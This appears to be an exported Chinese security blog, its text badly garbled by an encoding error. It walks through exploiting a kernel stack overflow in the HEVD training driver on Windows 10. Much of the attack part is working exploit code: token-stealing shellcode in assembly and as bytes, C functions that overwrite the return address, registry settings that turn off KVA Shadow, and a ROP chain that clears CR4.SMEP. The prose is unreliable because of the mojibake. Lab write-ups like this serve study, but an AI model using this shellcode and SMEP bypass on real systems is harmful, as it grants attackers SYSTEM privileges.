åæ±‡ç¼–è¯¥åœ°å€å¯¹åº”çš„ä¸€æ®µæ±‡ç¼–ï¼Œé€‚åˆåæ±‡ç¼–è¿™æ®µå‡½æ•°åé€‰æ‹©æ–­ç‚¹ 12uf &lt;å†…å­˜åœ°å€&gt;uf &lt;æ¨¡å—å&gt;!&lt;å‡½æ•°å&gt; è®¡ç®—å™¨ 1? &lt;è®¡ç®—è¡¨è¾¾å¼&gt; II. å†…å­˜å¸ƒå±€ 1234567891011121314void StackOverflow(HANDLE hDevice, unsigned int ioctl) &#123; char stackspace[0x1000] = &#123; 0 &#125;; unsigned int size = 0x80; RtlFillMemory(stackspace, size, &#x27;A&#x27;); DWORD info = 0; DeviceIoControl(hDevice, ioctl, stackspace, size, NULL, 0, &amp;info, NULL); printf(&quot;info: %d\\n&quot;, info); std::cout &lt;&lt; &quot;IO Complete\\n&quot;;&#125; å¦‚æœå¼•å‘æº¢å‡ºçš„è¯ï¼Œçœ‹çœ‹kernelä¸­çš„v5å˜é‡çš„å¸ƒå±€ è¿™é‡Œçš„kernelBufferå°±ç›¸å½“äºç”¨æˆ·æ¨¡å¼ä¸‹çš„â€œæ ˆå¸§â€ åŒæ—¶å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç¨‹åºçš„å†…å­˜ è¿™ä¸ªæ—¶å€™é¡ºä¾¿çœ‹ä¸€ä¸‹rbp åœ¨popå‰ä¸‹æ–­ç‚¹å†è¿è¡Œåˆ° æ‰€ä»¥æ˜¯rsp+0x20+0x818å°±å¾—åˆ°retçš„åœ°å€ å¾ˆæ˜æ˜¾è¿™é‡Œå¯ä»¥é€šè¿‡æ ˆæº¢å‡ºåŠ«æŒè¿”å›åœ°å€ï¼Œç„¶åå®ç°æˆ‘ä»¬çš„shellcode III. å¸ƒç½®æ„æ€ é¦–å…ˆ é©±åŠ¨æ˜¯64ä½ï¼Œæ‰€ä»¥è¦ç”¨64ä½çš„æ€ç»´å»å¸ƒå±€ å…¶æ¬¡ï¼Œé©±åŠ¨å’Œæˆ‘ä»¬çš„ç¨‹åºå†…å­˜ä¹‹é—´æ˜¯èƒ½è®¿é—®çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨Ring3å†™shellcodeï¼Œç„¶åè¦†ç›–åˆ°Ring0å»æ‰§è¡Œ é‚£ä¹ˆå°±æ˜¯ 1&quot;a&quot;*0x810+p64(shellcode_addr) Shellcode+expç¼–å†™ A. shellcode ä¸»è¦æ˜¯ç”¨è¿™ç¯‡ï¼šExploiting Windows 10 Kernel Drivers - Stack Overflow æˆ–è€…é‡Œé¢å‚è€ƒçš„ä¸¤ç¯‡ ä¸»è¦ç›®çš„å°±æ˜¯æ‹¿å»Tokenç„¶åæ›¿æ¢æ‰ä¸€ä¸ªcmd.exeçš„Tokenå®ç°ææƒï¼Œåœ¨ä¸‹ä¸€ç¯‡æ–‡ç« ä¸­ä¼šè¯¦ç»†æåˆ° This time around we will pass the PID into the shellcode, which means that our tweaked shellcode will look like this: 12345678910111213141516171819202122232425262728293031323334353637383940[BITS 64]push raxpush rbxpush rcxpush rsipush rdimov rax, [gs:0x180 + 0x8] ; Get &#x27;CurrentThread&#x27; from KPRCBmov rax, [rax + 0x220] ; Get &#x27;Process&#x27; property from current threadnext_process:cmp dword [rax + 0x2e0], 0x41414141 ; Search for &#x27;cmd.exe&#x27; process (&#x27;AAAA&#x27; replaced by exploit)je found_cmd_processmov rax, [rax + 0x2e8] ; If not found, go to next processsub rax, 0x2e8jmp next_processfound_cmd_process:mov rbx, rax ; Save our cmd.exe EPROCESS for laterfind_system_process:cmp dword [rax + 0x2e0], 0x00000004 ; Search for PID 4 (System process)je found_system_processmov rax, [rax + 0x2e8]sub rax, 0x2e8jmp find_system_processfound_system_process:mov rcx, [rax + 0x358] ; Take TOKEN from System processmov [rbx+0x358], rcx ; And copy it to the cmd.exe processpop rdipop rsipop rcxpop rbxpop rax; return goes here B. EXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859void StackOverflow(HANDLE hDevice, unsigned int ioctl) &#123; char stackspace[0x1000] = &#123; 0 &#125;; char shellcode[256] = &#123; 0x50, 0x53, 0x51, 0x56, 0x57, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x80, 0x20, 0x02, 0x00, 0x00, 0x81, 0xb8, 0xe0, 0x02, 0x00, 0x00, 0x41, 0x41, 0x41, 0x41, 0x74, 0x0f, 0x48, 0x8b, 0x80, 0xe8, 0x02, 0x00, 0x00, 0x48, 0x2d, 0xe8, 0x02, 0x00, 0x00, 0xeb, 0xe5, 0x48, 0x89, 0xc3, 0x83, 0xb8, 0xe0, 0x02, 0x00, 0x00, 0x04, 0x74, 0x0f, 0x48, 0x8b, 0x80, 0xe8, 0x02, 0x00, 0x00, 0x48, 0x2d, 0xe8, 0x02, 0x00, 0x00, 0xeb, 0xe8, 0x48, 0x8b, 0x88, 0x58, 0x03, 0x00, 0x00, 0x48, 0x89, 0x8b, 0x58, 0x03, 0x00, 0x00, 0x5f, 0x5e, 0x59, 0x5b, 0x58, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff &#125;; DWORD oldProtect; STARTUPINFOA si; PROCESS_INFORMATION pi; unsigned int size = 0x820; RtlFillMemory(stackspace, 0x810, &#x27;A&#x27;); *(unsigned long long*)(stackspace + 0x818) = (unsigned long long)shellcode; DWORD info = 0; VirtualProtect(shellcode, 256, PAGE_EXECUTE_READWRITE, &amp;oldProtect); printf(&quot;[*] Spawning a new cmd.exe process\\n&quot;); si.cb = sizeof(STARTUPINFOA); if (!CreateProcessA(NULL, (LPSTR)&quot;cmd.exe&quot;, NULL, NULL, true, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi)) &#123; printf(&quot;[!] FATAL: Error spawning cmd.exe\\n&quot;); return; &#125; printf(&quot;[*] Updating our shellcode to search for PID %d\\n&quot;, pi.dwProcessId); *(DWORD*)((char*)shellcode + 27) = pi.dwProcessId; DeviceIoControl(hDevice, ioctl, stackspace, size, NULL, 0, &amp;info, NULL); printf(&quot;info: %d\\n&quot;, info); std::cout &lt;&lt; &quot;IO Complete\\n&quot;;&#125; ç„¶ååˆ°retè¿”å›ï¼ŒæŸ¥çœ‹è¿”å›åœ°å€ 1k å‘ç°è¿”å›åœ°åœ°å€å·²ç»è¢«è¦†ç›–äº†ï¼Œç»§ç»­èµ°ä¸‹å» è·³è½¬åˆ°äº†shellcodeäº†ï¼Œå†èµ°ä¸¤æ­¥ ï¼Ÿï¼Ÿï¼Ÿ è¯´æˆ‘åœ¨æ‰§è¡Œä¸å¯æ‰§è¡Œçš„å†…å­˜ï¼Œä½†æ˜¯æ˜æ˜å·²ç»VirtualProtect(shellcode, 256, PAGE_EXECUTE_READWRITE, &amp;oldProtect); ï¼Ÿï¼Ÿï¼Ÿè¶Šæ¥è¶Šç¦»è°±äº† å°è¯•æŠŠshellcodeç§»åŠ¨åˆ°å¸¸é‡å†…å­˜ä¸­è¯•è¯•ï¼Œè¿˜æ˜¯ä¸è¡Œï¼Œæ¥ç€æˆ‘å†è¿›è¡Œioctlä¹‹å‰pauseä¸€ä¸‹ï¼Œå¥½åƒå¯ä»¥äº† ä½†æ˜¯ä¾ç„¶è¢«è¯´æ‰§è¡Œä¸å¯æ‰§è¡Œä»£ç  æ–°çš„ä¿æŠ¤æœºåˆ¶ æŸ¥äº†å…¶ä»–çš„è§£æ³•ï¼Œå‘ç°Windows 8è¿‡åå¾®è½¯æ·»åŠ äº†ä¸€ä¸ªå«åšSMEPä¿æŠ¤çš„ä¸œè¥¿ ä½ å¯ä»¥åœ¨è¿™é‡ŒæŸ¥åˆ°å…³äºWindowsçš„æ‰€æœ‰ä¿æŠ¤æœºåˆ¶ï¼šhttps://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10 ç›‘ç£å™¨æ¨¡å¼æ‰§è¡Œé˜²æŠ¤ (SMEP) ï¼šå¸®åŠ©é˜²æ­¢å†…æ ¸ (â€œç›‘ç£å™¨â€) åœ¨ç”¨æˆ·é¡µé¢ä¸­æ‰§è¡Œä»£ç ï¼Œè¿™æ˜¯æ”»å‡»è€…ç”¨äºæœ¬åœ°å†…æ ¸æå‡ç‰¹æƒ (EOP) çš„å¸¸è§æŠ€æœ¯ã€‚ æ­¤é…ç½®éœ€è¦åœ¨ Intel Ivy Bridge æˆ–æ›´é«˜ç‰ˆæœ¬å¤„ç†å™¨ä¸­æ‰¾åˆ°å¤„ç†å™¨æ”¯æŒï¼Œæˆ–è€…å…·æœ‰ PXN æ”¯æŒçš„ ARMã€‚ å°è¯•å…³é—­è¯¥ä¿æŠ¤åæ‰§è¡Œexpï¼Œä½†æ˜¯å‘ç°æ˜¯æ— æ³•å…³é—­çš„ï¼Œç”±äºå†…æ ¸çš„æ•´ä½“è®¾è®¡å¯¼è‡´è¯¥ä¿æŠ¤åœ¨windows8åŠä»¥ä¸Šæ˜¯ä¸èƒ½è¢«å…³é—­çš„ï¼Œé‚£ä¹ˆå°±åªèƒ½æƒ³åŠæ³•ç»•è¿‡äº† A. SMEPä¿æŠ¤æœºåˆ¶åŠæ‰‹åŠ¨ç»•è¿‡ è¯¥ä¿æŠ¤æœºåˆ¶å¼ºçƒˆä¾èµ–äºCPUçš„RC4å¯„å­˜å™¨ï¼Œåˆšå¥½æˆ‘è¿™é‡Œæœ‰ã€Šè‹±ç‰¹å°”Â® 64 ä½å’Œ IA-32 æ¶æ„å¼€å‘äººå‘˜æ‰‹å†Œåˆè®¢æœ¬ã€‹ï¼Œç¿»å‡ºæ¥çœ‹ä¸€ä¸‹ [æœºç¿»]ä»ç”¨æˆ·æ¨¡å¼åœ°å€è·å–æŒ‡ä»¤ã€‚ è®¿é—®æƒé™å–å†³äº CR4.SMEP çš„å€¼ï¼š â€¢ å¦‚æœCR4.SMEP = 0ï¼Œè®¿é—®æƒé™å–å†³äºåˆ†é¡µæ¨¡å¼å’ŒIA32_EFER.NXE çš„å€¼ï¼š â€” å¯¹äº 32 ä½åˆ†é¡µæˆ–å¦‚æœ IA32_EFER.NXE = 0ï¼Œåˆ™å¯ä»¥ä»ä»»ä½•ç”¨æˆ·æ¨¡å¼è·å–æŒ‡ä»¤ åœ°å€ã€‚ â€” å¯¹äº IA32_EFER.NXE = 1 çš„å…¶ä»–åˆ†é¡µæ¨¡å¼ï¼Œå¯ä»¥é€šè¿‡æ¯ä¸ªåˆ†é¡µç»“æ„æ¡ç›®ä¸­ XD æ ‡å¿—ä¸º 0 çš„è½¬æ¢ä»ä»»ä½•ç”¨æˆ·æ¨¡å¼åœ°å€è·å–æŒ‡ä»¤ æ§åˆ¶ç¿»è¯‘ï¼› æŒ‡ä»¤å¯èƒ½æ— æ³•ä»ä»»ä½•ç”¨æˆ·æ¨¡å¼åœ°å€è·å– åœ¨ä»»ä½•æ§åˆ¶è½¬æ¢çš„åˆ†é¡µç»“æ„æ¡ç›®ä¸­ XD æ ‡å¿—ä¸º 1 çš„è½¬æ¢ã€‚ â€¢ å¦‚æœCR4.SMEP = 1ï¼Œåˆ™ä¸èƒ½ä»ä»»ä½•ç”¨æˆ·æ¨¡å¼åœ°å€è·å–æŒ‡ä»¤ã€‚ â€” ä»…å…è®¸å¯¹ç®¡ç†å‘˜æ¨¡å¼å½±å­å †æ ˆåœ°å€è¿›è¡Œç®¡ç†å‘˜æ¨¡å¼å½±å­å †æ ˆè®¿é—® ï¼ˆå¾€ä¸Šçœ‹ï¼‰ã€‚ æˆ–è®¸æˆ‘ä»¬å°†CR4.SMEPçš„å€¼è®¾ç½®ä¸º0ï¼Œè®¿é—®æƒé™ç”±é¡µä¸­çš„U/Sæ ‡å¿—ä½å†³å®š CR4å¯„å­˜å™¨çš„ç»“æ„å¦‚ä¸‹ï¼ˆå°ç«¯åºé¡ºåºä»å³å‘å·¦ï¼‰ï¼š ä¸æ€¥ï¼Œç»§ç»­æœç´¢å‘ç°äº†ä¸€ä»½Intelå…³äºSMEPçš„æ›´è¯¦ç»†çš„æè¿° æ–‡æ¡£ï¼šhttps://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf å°è¯•ä½¿ç”¨è°ƒè¯•èµ·ä¿®æ”¹CR4 å¦‚æœä¿®æ”¹ç¬¬20ä½ä¸º0ï¼Œrcçš„å€¼ä¸º0x270678ï¼Œç„¶è€Œè¿˜æ˜¯ä¸è¡Œ B. KVAS Windowså†…æ ¸ç¼“è§£æœºåˆ¶ä½¿ç”¨äº†Kva Shadowå†…å­˜ï¼Œæ¯”å¦‚MeltDownæ¼æ´å°±äºæ­¤æœ‰å…³ï¼Œé¦–å…ˆä¸ä¼šè®²ç»†èŠ‚ï¼Œåœ¨ä¸‹ä¸€ç¯‡æ–‡ç« ä¼šè®²åˆ°ï¼Œå°è¯•å°†å…¶å…³é—­ å†æ³¨å†Œè¡¨HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management åˆ›å»ºä¸¤ä¸ªDWORDå€¼ï¼šFeatureSettingsOverride FeatureSettingsOverrideMask è®¾ç½®å€¼ä¸º3ï¼Œç„¶åé‡å¯ ç°åœ¨æ‰‹åŠ¨è®¾ç½®cr4.SMEPä¸º0 ç»ˆäºè¿è¡Œäº† shellcodeçš„ä¸€äº›åç§»æœ‰é—®é¢˜ æ›´æ¢ä¸º 12345678910111213141516171819202122232425262728BYTE cmd[256] = &#123; 0x48, 0x31, 0xc0, 0x65, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc1, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x50, 0xf8, 0x49, 0x89, 0xc0, 0x48, 0x8b, 0x00, 0x48, 0x83, 0xfa, 0x04, 0x75, 0xf0, 0x49, 0x8b, 0x50, 0x70, 0x48, 0x83, 0xe2, 0xf8, 0x49, 0x8b, 0x89, 0xb8, 0x04, 0x00, 0x00, 0x48, 0x83, 0xe1, 0x07, 0x48, 0x01, 0xca, 0x49, 0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff&#125;; EXP 123456789101112131415161718192021222324252627282930void StackOverflow(HANDLE hDevice, unsigned int ioctl) &#123; char stackspace[0x1000] = &#123; 0 &#125;; DWORD oldProtect; printf(&quot;[*] Start Exploit\\n&quot;); LPVOID shellcode_addr = VirtualAlloc(NULL, sizeof(cmd), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(shellcode_addr, cmd, sizeof(cmd)); unsigned int size = 0x820; RtlFillMemory(stackspace, 0x810, &#x27;A&#x27;); *(unsigned long long*)(stackspace + 0x818) = (unsigned long long)shellcode_addr; DWORD info = 0; printf(&quot;shellcode space %p\\n&quot;, shellcode_addr); printf(&quot;[*] Spawning a new cmd.exe process\\n&quot;); system(&quot;pause&quot;); DeviceIoControl(hDevice, ioctl, stackspace, size, NULL, 0, &amp;info, NULL); printf(&quot;info: %d\\n&quot;, info); system(&quot;cmd.exe&quot;);&#125; è°ƒè¯•ä¸­æ‰‹åŠ¨CR4.SMEP=0ï¼ˆæ³¨æ„ï¼Œä¹‹å‰å·²ç»å…³é—­äº†KVAï¼‰ C. ä½¿ç”¨å†…æ ¸ROPç»•è¿‡SMEP é¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸€ä¸ªç±»ä¼¼äºmov rc4,xxxçš„ropï¼Œè®©rc4.smep=0ï¼Œ å‚è€ƒåœ¨Linuxä¸‹è¿›è¡ŒROPçš„ç»éªŒï¼Œ payloadå¤§è‡´é•¿è¿™æ ·çš„ 1234*(unsigned long long*)(stackspace + 0x818) = (unsigned long long)pop_rcx_ret;*(unsigned long long*)(stackspace + 0x820) = (unsigned long long)0x00000000002506f8; //set RCX = currentRC4*(unsigned long long*)(stackspace + 0x828) = (unsigned long long)mov_rc4_rcx_ret;*(unsigned long long*)(stackspace + 0x830) = (unsigned long long)shellcode_addr; å¤šè°ƒè¯•æˆ–è€…ç¼–ç¨‹è‡ªåŠ¨å¯»æ‰¾å°±å¯ä»¥æ‰¾åˆ°äº†ï¼Œè¿™é‡Œæš‚æ—¶å‚è€ƒHEVD Exploits â€“ Windows 10 x64 Stack Overflow SMEP Bypass ä¿®æ”¹EXP 1234567unsigned int size = 0x840;RtlFillMemory(stackspace, 0x810, &#x27;A&#x27;);*(unsigned long long*)(stackspace + 0x818) = (unsigned long long)0xfffff807743f52c0;*(unsigned long long*)(stackspace + 0x820) = (unsigned long long)0x00000000002506f8; //set RCX = currentRC4*(unsigned long long*)(stackspace + 0x828) = (unsigned long long)0xfffff807749a41cf;*(unsigned long long*)(stackspace + 0x830) = (unsigned long long)shellcode_addr;printf(&quot;[*] Start set ROP\\n&quot;); æ²¡æœ‰ä¸‹æ–­ç‚¹ç›´æ¥è¿‡ é—ç•™ ä¸‹ä¸€ç¯‡ userç¼–ç¨‹å¯»æ‰¾ROPGadget shellcodeç¼–å†™ Tokenææƒ KVAS å‚è€ƒ https://www.bilibili.com/video/BV1pD4y1a7hP/ https://www.cnblogs.com/XiuzhuKirakira/p/16995784.html https://blog.xpnsec.com/hevd-stack-overflow https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10 https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/ https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf https://wumb0.in/windows-10-kvas-and-software-smep.html https://github.com/xct/windows-kernel-exploits/","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"},{"name":"pwn","slug":"pwn","permalink":"https://joe1sn.eu.org/tags/pwn/"}]},{"title":"ã€Win Pwnã€‘ä»é›¶æ¢ç´¢ç°ä»£windowså†…æ ¸æ ˆæº¢å‡º-ä»¥HEVDç»ƒä¹ ä¸ºä¾‹ï¼ˆä¸Šï¼‰","slug":"win-hevd-exp-stackoverflow-I","date":"2024-01-25T07:07:29.000Z","updated":"2024-01-30T10:35:21.416Z","comments":true,"path":"2024/01/25/win-hevd-exp-stackoverflow-I/","link":"","permalink":"https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/","excerpt":"å¼€å§‹åšHEVDæ¥ç†Ÿæ‚‰windowsçš„å†…æ ¸æ¼æ´åˆ©ç”¨æ–¹å¼æ—¶ï¼Œå‘ç°å¤§å¤šæ•°çš„èµ„æ–™ä¾æ—§åŸºäºwindows7ï¼Œä½†æ˜¯ç›®å‰ä¸»æµçš„æ“ä½œç³»ç»Ÿå·²ç»æ˜¯win10ï¼Œæ‰€ä»¥è¿˜æ˜¯å¾—æ›´ä¸Šæ—¶ä»£æ½®æµçš„ æ–‡ç« å·²åœ¨å…ˆçŸ¥ç¤¾åŒºæŠ•ç¨¿ï¼šhttps://xz.aliyun.com/t/13363","text":"å¼€å§‹åšHEVDæ¥ç†Ÿæ‚‰windowsçš„å†…æ ¸æ¼æ´åˆ©ç”¨æ–¹å¼æ—¶ï¼Œå‘ç°å¤§å¤šæ•°çš„èµ„æ–™ä¾æ—§åŸºäºwindows7ï¼Œä½†æ˜¯ç›®å‰ä¸»æµçš„æ“ä½œç³»ç»Ÿå·²ç»æ˜¯win10ï¼Œæ‰€ä»¥è¿˜æ˜¯å¾—æ›´ä¸Šæ—¶ä»£æ½®æµçš„ æ–‡ç« å·²åœ¨å…ˆçŸ¥ç¤¾åŒºæŠ•ç¨¿ï¼šhttps://xz.aliyun.com/t/13363 0. å‰ç½®ç¯å¢ƒ æ›´åŸºç¡€ WIndows10 Vmwareè™šæ‹Ÿæœº Visual Studio 2019ï¼Œæœ‰WDK Windbg Previewï¼ˆæˆ‘ç”¨å•çº¯æ˜¯è§‰å¾—æ›´å¥½çœ‹ï¼‰ æœ€é‡è¦çš„HEVDé¡¹ç›®ï¼šhttps://github.com/hacksysteam/HackSysExtremeVulnerableDriverï¼Œæˆ‘ç›´æ¥ä¸‹è½½çš„3.00 Releaseç‰ˆ æˆ‘ä½¿ç”¨çš„Windowsç‰ˆæœ¬æ˜¯ I. ç¼–ç¨‹ç¯å¢ƒ å¦‚æœä½ æƒ³å¿«é€Ÿæ­å»ºä¸€ä¸ªé©±åŠ¨å¼€å‘ç¯å¢ƒå¯ä»¥å‚è€ƒBç«™ä¸Šçš„ä¸€äº›èµ„æ–™ï¼Œå¦‚ï¼šé…ç½®é©±åŠ¨å¼€å‘ç¯å¢ƒ å¦‚æœæŒ‰ç…§æ­¥éª¤vsæ²¡æœ‰KernelModDriverè¿™ä¸€æ¨¡æ¿ï¼Œæ‰¾åˆ°vsç›®å½•çš„WDK.vsixåŒå‡»å³å¯ ä¸€æ®µé©±åŠ¨çš„ä¸»è¦ä»£ç ï¼Œåœ¨main.cppä¸­ç¼–å†™ 123456789101112131415161718192021#include &lt;ntifs.h&gt;#include &quot;win10.h&quot;#include &quot;x64.h&quot;VOIDDriverUnload(PDRIVER_OBJECT DriverObject)&#123; UNREFERENCED_PARAMETER(DriverObject); DbgPrint(&quot;Driver Stopping -&gt; %wZ\\n&quot;, &amp;DriverObject-&gt;DriverName);&#125;NTSTATUSDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)&#123; UNREFERENCED_PARAMETER(RegistryPath); DbgPrint(&quot;Driver Running -&gt; %wZ\\n&quot;, &amp;DriverObject-&gt;DriverName); DriverObject-&gt;DriverUnload = DriverUnload; return STATUS_SUCCESS;&#125; è§„å®šäº†é©±åŠ¨åŠ è½½å’Œå¸è½½çš„ä¸¤ä¸ªå‡½æ•°ï¼Œå¹¶åœ¨åŠ è½½å’Œå¸è½½æ—¶æ‰“å°è°ƒè¯•ä¿¡æ¯ II. è°ƒè¯•ç¯å¢ƒ ä¼ ç»Ÿä¸²å£è°ƒè¯• æ·»åŠ ä¸²å£ åœ¨è™šæ‹Ÿæœºä¸­Win+Rå¬å”¤msconfigï¼Œæ‰“å¼€å…è®¸ä¸²å£è°ƒè¯• ç„¶ååœ¨ï¼ˆè®°å¾—ç”¨ç®¡ç†å‘˜æ‰“å¼€ï¼‰windbgä¸­æŒ‰ç…§å›¾ä¸­é…ç½®å³å¯ï¼Œå…¶ä»–é€‰é¡¹ä¸å˜ ä¸€ç›´æ‰¾ä¸åˆ°ç®¡é“çš„è¯å¯ä»¥ç‚¹Breakå†ç­‰ä¼šå„¿å°±æœ‰äº† VirtualKDæ³•è°ƒè¯• é¡¹ç›®é“¾æ¥ï¼šhttp://virtualkd.sysprogs.org/ å®‰è£…åï¼Œvmmon64.exeå°±è¡Œäº† ä½†æ˜¯ç”¨äº†å°±ä¸èƒ½ç”¨ä¸²å£è°ƒè¯•äº† æ‰“å¼€ä¿¡æ¯æ˜¾ç¤º+DbgView åœ¨\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\æ³¨å†Œè¡¨ä¸­æ·»åŠ Debug Print Filterï¼Œå¹¶è®¾ç½®ä¸€ä¸ªDefaultçš„DWORDå€¼ï¼Œä½ å¯ä»¥å°†å…¶è®¾ç½®ä¸º0x8æˆ–è€…å…è®¸æ›´å¤šè°ƒè¯•ä¿¡æ¯çš„0xf è™½ç„¶è¯´windbgç¡®å®èƒ½æ‰“å°å‡ºDbgPrintï¼Œä½†æ˜¯HEVDä½¿ç”¨çš„æ˜¯DbgPrintExï¼Œæ¥å—ä¸åˆ°ï¼Œå®‰è£…äº†DbgViewåï¼Œä»–ä¼šæŠŠè°ƒè¯•ä¿¡æ¯æ‰“å°å‡ºäº†å¹¶ä¸”windbgä¹Ÿèƒ½æ”¶åˆ° è°ƒè¯•æŒ‡ä»¤ å¦‚æœå‡ºç°äº†ä»¥ä¸‹æƒ…å†µä¸”è™šæ‹Ÿæœºå¡é¡¿ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸¤ä¸ªæŒ‡ä»¤å…³é—­è¾“å‡º 121: kd&gt; ed nt!Kd_SXS_Mask 01: kd&gt; ed nt!Kd_FUSION_Mask 0 å…³é—­è¿™ä¸¤ä¸ªå‡½æ•°çš„è¾“å‡ºï¼Œè«åå…¶å¦™å˜å¡çš„è¯å†ç”¨ä¸€ä¸‹ III. é©±åŠ¨åŠ è½½ ä½¿ç”¨KmdManager.exeï¼Œæ¯›å­çš„é»‘ç§‘æŠ€ï¼Œä½¿ç”¨æ—¶éœ€è¦ç®¡ç†å‘˜å¯åŠ¨ ä¹Ÿå¯ä»¥ä½¿ç”¨osLoaderå•¥çš„ è¿™é‡Œç”¨KmdKitçš„KmdManageræ¼”ç¤ºï¼Œè¿è¡ŒHEVD é‚£ä¹ˆå°±ç®—æ­å»ºæˆåŠŸ A. ç¼–ç¨‹åŸºç¡€ å…³äºå†…æ ¸æ¨¡å¼é©±åŠ¨ç¨‹åºï¼šhttps://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/ å†…æ ¸ä¸­äº¤äº’æ˜¯é€šè¿‡IRPè¯·æ±‚è¿›è¡Œäº¤äº’çš„ IRP ç»“æ„æ˜¯è¡¨ç¤º I/O è¯·æ±‚æ•°æ®åŒ…çš„éƒ¨åˆ†ä¸é€æ˜ç»“æ„ã€‚ IRP ç»“æ„çš„æœªè®°å½•æˆå‘˜æ˜¯ä¿ç•™çš„ï¼Œä»…ç”± I/O ç®¡ç†å™¨ä½¿ç”¨ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç”±æ–‡ä»¶ç³»ç»Ÿé©±åŠ¨ç¨‹åº (FSD) ä½¿ç”¨ã€‚ MSDNï¼šhttps://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp ä½¿ç”¨åˆ°çš„å†…å­˜å †æ ˆä¸ºI/O Stack I/O 